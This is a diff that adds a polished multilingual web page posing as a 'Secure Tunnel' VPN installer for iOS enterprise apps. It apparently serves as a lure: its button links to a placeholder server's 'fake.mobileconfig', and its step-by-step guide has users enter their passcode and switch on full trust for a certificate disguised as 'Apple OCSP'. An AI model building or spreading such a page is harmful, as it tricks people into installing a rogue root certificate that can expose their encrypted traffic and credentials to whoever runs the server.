@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Install VPN Config</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: -apple-system, "Helvetica Neue", sans-serif;
+            padding: 20px;
+            position: relative;
+        }
+        .lang-switcher {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 999;
+            display: flex;
+            gap: 6px;
+            flex-wrap: wrap;
+            justify-content: flex-end;
+        }
+        .lang-btn {
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,255,255,0.1);
+            color: rgba(255,255,255,0.5);
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            cursor: pointer;
+            transition: all 0.3s;
+            backdrop-filter: blur(10px);
+            font-weight: 500;
+        }
+        .lang-btn:hover {
+            background: rgba(255,255,255,0.15);
+        }
+        .lang-btn.active {
+            background: rgba(0,210,255,0.2);
+            border-color: #00d2ff;
+            color: #00d2ff;
+        }
+        .card {
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 30px;
+            padding: 40px 30px;
+            max-width: 420px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.5);
+            margin-top: 40px;
+        }
+        .icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #00d2ff, #3a7bd5);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 40px;
+            box-shadow: 0 10px 30px rgba(0,210,255,0.3);
+        }
+        h1 {
+            color: #fff;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        .sub {
+            color: rgba(255,255,255,0.6);
+            font-size: 14px;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #00d2ff, #3a7bd5);
+            color: #fff;
+            font-size: 18px;
+            font-weight: 600;
+            border: none;
+            border-radius: 16px;
+            cursor: pointer;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 30px rgba(0,210,255,0.25);
+        }
+        .btn:active {
+            transform: scale(0.96);
+            box-shadow: 0 5px 15px rgba(0,210,255,0.15);
+        }
+        .btn-secondary {
+            background: rgba(255,255,255,0.08);
+            box-shadow: none;
+            margin-top: 12px;
+            font-size: 14px;
+            color: rgba(255,255,255,0.5);
+        }
+        .steps {
+            margin: 25px 0;
+            text-align: left;
+            background: rgba(255,255,255,0.03);
+            border-radius: 16px;
+            padding: 20px;
+        }
+        .steps li {
+            color: rgba(255,255,255,0.7);
+            font-size: 13px;
+            line-height: 1.8;
+            list-style: none;
+            padding-left: 28px;
+            position: relative;
+            margin-bottom: 8px;
+        }
+        .steps li:before {
+            content: "✓";
+            position: absolute;
+            left: 0;
+            color: #00d2ff;
+            font-weight: bold;
+        }
+        .status {
+            color: rgba(255,255,255,0.3);
+            font-size: 12px;
+            margin-top: 20px;
+        }
+        .badge {
+            display: inline-block;
+            background: rgba(0,210,255,0.15);
+            color: #00d2ff;
+            font-size: 11px;
+            padding: 4px 12px;
+            border-radius: 20px;
+            margin-bottom: 15px;
+        }
+        @media (max-width: 480px) {
+            .lang-switcher {
+                top: 10px;
+                right: 10px;
+                gap: 4px;
+            }
+            .lang-btn {
+                font-size: 10px;
+                padding: 3px 8px;
+            }
+            .card {
+                padding: 30px 20px;
+                margin-top: 50px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<!-- ===== 多语言切换按钮 ===== -->
+<div class="lang-switcher" id="langSwitcher">
+    <button class="lang-btn active" data-lang="en">🇬🇧 EN</button>
+    <button class="lang-btn" data-lang="zh">🇨🇳 中文</button>
+    <button class="lang-btn" data-lang="ja">🇯🇵 日本語</button>
+    <button class="lang-btn" data-lang="ko">🇰🇷 한국어</button>
+    <button class="lang-btn" data-lang="fr">🇫🇷 FR</button>
+    <button class="lang-btn" data-lang="es">🇪🇸 ES</button>
+    <button class="lang-btn" data-lang="ru">🇷🇺 RU</button>
+    <button class="lang-btn" data-lang="ar">🇸🇦 العربية</button>
+</div>
+
+<!-- ===== 主卡片 ===== -->
+<div class="card">
+    <div class="icon">🛡️</div>
+    <span class="badge" id="badge">● Secure Tunnel</span>
+    <h1 id="title">Install VPN Config</h1>
+    <p class="sub" id="subText">Install the profile below to use enterprise apps normally</p>
+
+    <div class="steps">
+        <li id="step1">Tap the button below to install</li>
+        <li id="step2">Go to Settings → General → VPN & Device Management</li>
+        <li id="step3">Tap Install and enter your passcode</li>
+        <li id="step4">Go to Settings → General → About → Certificate Trust Settings</li>
+        <li id="step5">Enable the certificate switch</li>
+    </div>
+
+    <!-- 核心安装按钮 -->
+    <a href="https://你的服务器IP/fake.mobileconfig" class="btn" id="installBtn">
+        📲 <span id="btnText">Install Configuration Profile</span>
+    </a>
+
+    <a href="#" class="btn btn-secondary" id="guideBtn">
+        ❓ <span id="guideText">Need help? Tap here</span>
+    </a>
+
+    <div class="status" id="statusText">v2.3 · iOS 14-17</div>
+</div>
+
+<script>
+// ============================================================
+//  多语言字典（8种语言）
+// ============================================================
+const LANG = {
+    en: {
+        badge: '● Secure Tunnel',
+        title: 'Install VPN Config',
+        sub: 'Install the profile below to use enterprise apps normally',
+        step1: 'Tap the button below to install',
+        step2: 'Go to Settings → General → VPN & Device Management',
+        step3: 'Tap Install and enter your passcode',
+        step4: 'Go to Settings → General → About → Certificate Trust Settings',
+        step5: 'Enable the certificate switch',
+        btn: 'Install Configuration Profile',
+        guide: 'Need help? Tap here',
+        status: 'v2.3 · iOS 14-17',
+        alertTitle: '📖 Installation Guide',
+        alertBody: '1. Tap "Install Configuration Profile"\n2. Allow download, then tap "Downloaded Profile" at top of Settings\n3. Tap Install → enter passcode → Install again\n4. Go to Settings → General → About → Certificate Trust Settings\n5. Find "Apple OCSP" certificate and turn it ON (green)\n6. Return to home screen and open your enterprise app\n\n⚠️ If you see "Cannot verify", check your internet connection'
+    },
+    zh: {
+        badge: '● 安全加密通道',
+        title: '安装防掉签配置',
+        sub: '安装下方描述文件后，即可正常使用企业版应用',
+        step1: '点击下方按钮安装配置',
+        step2: '去「设置」→「通用」→「VPN与设备管理」',
+        step3: '点击「安装」并输入锁屏密码',
+        step4: '返回「设置」→「通用」→「关于本机」→「证书信任设置」',
+        step5: '启用对应的证书开关',
+        btn: '安装配置描述文件',
+        guide: '安装后无法打开？点此查看指引',
+        status: 'v2.3 · 兼容 iOS 14-17',
+        alertTitle: '📖 完整安装步骤',
+        alertBody: '1. 点击「安装配置描述文件」\n2. 允许下载后，在「设置」顶部会有一条「已下载描述文件」\n3. 点击它 → 右上角「安装」→ 输入密码 → 再次「安装」\n4. 去「设置」→「通用」→「关于本机」→「证书信任设置」\n5. 找到「Apple OCSP」证书，把开关打开（绿色）\n6. 返回桌面，打开你的企业版App即可正常使用\n\n⚠️ 如果安装时提示「无法验证」，请检查网络是否畅通'
+    },
+    ja: {
+        badge: '● セキュアトンネル',
+        title: 'VPN構成をインストール',
+        sub: '以下のプロファイルをインストールして、エンタープライズアプリを使用してください',
+        step1: '下のボタンをタップしてインストール',
+        step2: '設定 → 一般 → VPNとデバイス管理へ',
+        step3: '「インストール」をタップし、パスコードを入力',
+        step4: '設定 → 一般 → 情報 → 証明書信頼設定へ',
+        step5: '証明書スイッチを有効にする',
+        btn: '構成プロファイルをインストール',
+        guide: 'ヘルプが必要ですか？タップしてください',
+        status: 'v2.3 · iOS 14-17 対応',
+        alertTitle: '📖 インストールガイド',
+        alertBody: '1. 「構成プロファイルをインストール」をタップ\n2. ダウンロード後、設定の上部に「ダウンロードされたプロファイル」が表示\n3. タップ → インストール → パスコード入力 → 再びインストール\n4. 設定 → 一般 → 情報 → 証明書信頼設定へ\n5. 「Apple OCSP」証明書をオンにする（緑色）\n6. ホーム画面に戻り、エンタープライズアプリを開く\n\n⚠️ 「検証できません」と表示された場合、インターネット接続を確認'
+    },
+    ko: {
+        badge: '● 보안 터널',
+        title: 'VPN 구성 설치',
+        sub: '아래 프로필을 설치하여 엔터프라이즈 앱을 정상적으로 사용하세요',
+        step1: '아래 버튼을 눌러 설치',
+        step2: '설정 → 일반 → VPN 및 기기 관리로 이동',
+        step3: '설치를 누르고 암호 입력',
+        step4: '설정 → 일반 → 정보 → 인증서 신뢰 설정으로 이동',
+        step5: '인증서 스위치를 켜기',
+        btn: '구성 프로필 설치',
+        guide: '도움이 필요하세요? 여기를 누르세요',
+        status: 'v2.3 · iOS 14-17 호환',
+        alertTitle: '📖 설치 가이드',
+        alertBody: '1. 「구성 프로필 설치」탭\n2. 다운로드 후 설정 상단에 「다운로드된 프로필」표시\n3. 탭 → 설치 → 암호 입력 → 다시 설치\n4. 설정 → 일반 → 정보 → 인증서 신뢰 설정으로 이동\n5. 「Apple OCSP」인증서를 켜기 (초록색)\n6. 홈 화면으로 돌아가 엔터프라이즈 앱 실행\n\n⚠️ 「확인할 수 없음」메시지가 나오면 인터넷 연결 확인'
+    },
+    fr: {
+        badge: '● Tunnel Sécurisé',
+        title: 'Installer la Config VPN',
+        sub: 'Installez le profil ci-dessous pour utiliser les apps d\'entreprise',
+        step1: 'Appuyez sur le bouton ci-dessous',
+        step2: 'Allez à Réglages → Général → VPN et Gestion de l\'appareil',
+        step3: 'Appuyez sur Installer et entrez votre code',
+        step4: 'Allez à Réglages → Général → Infos → Réglages de confiance des certificats',
+        step5: 'Activez le certificat',
+        btn: 'Installer le Profil de Configuration',
+        guide: 'Besoin d\'aide? Appuyez ici',
+        status: 'v2.3 · iOS 14-17',
+        alertTitle: '📖 Guide d\'installation',
+        alertBody: '1. Appuyez sur "Installer le Profil"\n2. Autorisez le téléchargement, puis "Profil téléchargé" en haut de Réglages\n3. Appuyez sur Installer → code → Installer à nouveau\n4. Réglages → Général → Infos → Réglages de confiance des certificats\n5. Activez le certificat "Apple OCSP" (vert)\n6. Retour à l\'écran d\'accueil et ouvrez votre app\n\n⚠️ Si "Impossible de vérifier", vérifiez votre connexion'
+    },
+    es: {
+        badge: '● Túnel Seguro',
+        title: 'Instalar Configuración VPN',
+        sub: 'Instala el perfil a continuación para usar apps empresariales',
+        step1: 'Toca el botón de abajo para instalar',
+        step2: 'Ve a Ajustes → General → VPN y Gestión del Dispositivo',
+        step3: 'Toca Instalar e ingresa tu código',
+        step4: 'Ve a Ajustes → General → Información → Configuración de Confianza de Certificados',
+        step5: 'Activa el certificado',
+        btn: 'Instalar Perfil de Configuración',
+        guide: '¿Necesitas ayuda? Toca aquí',
+        status: 'v2.3 · iOS 14-17',
+        alertTitle: '📖 Guía de instalación',
+        alertBody: '1. Toca "Instalar Perfil de Configuración"\n2. Permite la descarga, luego "Perfil Descargado" en Ajustes\n3. Toca Instalar → código → Instalar de nuevo\n4. Ajustes → General → Información → Configuración de Confianza\n5. Activa el certificado "Apple OCSP" (verde)\n6. Vuelve al inicio y abre tu app\n\n⚠️ Si aparece "No se puede verificar", revisa tu conexión'
+    },
+    ru: {
+        badge: '● Безопасный туннель',
+        title: 'Установить VPN-конфиг',
+        sub: 'Установите профиль ниже для использования корпоративных приложений',
+        step1: 'Нажмите кнопку ниже для установки',
+        step2: 'Перейдите в Настройки → Основные → VPN и управление устройством',
+        step3: 'Нажмите Установить и введите пароль',
+        step4: 'Перейдите в Настройки → Основные → Об этом устройстве → Доверие сертификатам',
+        step5: 'Включите сертификат',
+        btn: 'Установить профиль конфигурации',
+        guide: 'Нужна помощь? Нажмите здесь',
+        status: 'v2.3 · iOS 14-17',
+        alertTitle: '📖 Руководство по установке',
+        alertBody: '1. Нажмите "Установить профиль"\n2. Разрешите загрузку, затем "Загруженный профиль" в Настройках\n3. Нажмите Установить → пароль → Установить снова\n4. Настройки → Основные → Об этом устройстве → Доверие сертификатам\n5. Включите сертификат "Apple OCSP" (зеленый)\n6. Вернитесь на главный экран и откройте приложение\n\n⚠️ Если "Не удается проверить", проверьте интернет'
+    },
+    ar: {
+        badge: '● نفق آمن',
+        title: 'تثبيت إعدادات VPN',
+        sub: 'قم بتثبيت الملف الشخصي أدناه لاستخدام تطبيقات المؤسسة',
+        step1: 'اضغط على الزر أدناه للتثبيت',
+        step2: 'انتقل إلى الإعدادات → عام → VPN وإدارة الجهاز',
+        step3: 'اضغط على تثبيت وأدخل رمز المرور',
+        step4: 'انتقل إلى الإعدادات → عام → حول → إعدادات الثقة للشهادات',
+        step5: 'قم بتشغيل مفتاح الشهادة',
+        btn: 'تثبيت ملف التكوين',
+        guide: 'بحاجة إلى مساعدة؟ اضغط هنا',
+        status: 'iOS 14-17 · v2.3',
+        alertTitle: '📖 دليل التثبيت',
+        alertBody: '1. اضغط "تثبيت ملف التكوين"\n2. اسمح بالتنزيل، ثم "الملف الشخصي الذي تم تنزيله" في الإعدادات\n3. اضغط تثبيت → رمز المرور → تثبيت مرة أخرى\n4. الإعدادات → عام → حول → إعدادات الثقة للشهادات\n5. قم بتشغيل شهادة "Apple OCSP" (أخضر)\n6. عد إلى الشاشة الرئيسية وافتح تطبيقك\n\n⚠️ إذا ظهر "لا يمكن التحقق"، تحقق من اتصالك بالإنترنت'
+    }
+};
+
+// ============================================================
+//  核心逻辑
+// ============================================================
+let currentLang = 'en';
+
+function switchLanguage(lang) {
+    currentLang = lang;
+    const t = LANG[lang];
+    if (!t) return;
+
+    document.getElementById('badge').textContent = t.badge;
+    document.getElementById('title').textContent = t.title;
+    document.getElementById('subText').textContent = t.sub;
+    document.getElementById('step1').textContent = t.step1;
+    document.getElementById('step2').textContent = t.step2;
+    document.getElementById('step3').textContent = t.step3;
+    document.getElementById('step4').textContent = t.step4;
+    document.getElementById('step5').textContent = t.step5;
+    document.getElementById('btnText').textContent = t.btn;
+    document.getElementById('guideText').textContent = t.guide;
+    document.getElementById('statusText').textContent = t.status;
+
+    // 更新按钮高亮
+    document.querySelectorAll('.lang-btn').forEach(btn => {
+        btn.classList.toggle('active', btn.dataset.lang === lang);
+    });
+
+    // 保存偏好
+    try { localStorage.setItem('pref_lang', lang); } catch(e) {}
+}
+
+// ============================================================
+//  事件绑定
+// ============================================================
+// 语言切换
+document.querySelectorAll('.lang-btn').forEach(btn => {
+    btn.addEventListener('click', function() {
+        switchLanguage(this.dataset.lang);
+    });
+});
+
+// 安装按钮点击反馈
+document.getElementById('installBtn').addEventListener('click', function(e) {
+    const t = LANG[currentLang];
+    const status = document.getElementById('statusText');
+    status.textContent = '⏳ ' + (currentLang === 'zh' ? '正在跳转...' : 'Redirecting...');
+    status.style.color = '#00d2ff';
+    setTimeout(() => {
+        status.textContent = t.status;
+        status.style.color = 'rgba(255,255,255,0.3)';
+    }, 3000);
+});
+
+// 帮助按钮
+document.getElementById('guideBtn').addEventListener('click', function(e) {
+    e.preventDefault();
+    const t = LANG[currentLang];
+    alert(t.alertTitle + '\n\n' + t.alertBody);
+});
+
+// ============================================================
+//  启动：读取用户之前保存的语言偏好
+// ============================================================
+(function init() {
+    try {
+        const saved = localStorage.getItem('pref_lang');
+        if (saved && LANG[saved]) {
+            switchLanguage(saved);
+        } else {
+            // 自动检测浏览器语言
+            const browserLang = navigator.language || navigator.languages?.[0] || 'en';
+            const detected = browserLang.split('-')[0];
+            if (LANG[detected]) {
+                switchLanguage(detected);
+            }
+        }
+    } catch(e) {
+        // 默认英文
+        switchLanguage('en');
+    }
+})();
+</script>
+
+</body>
+</html>
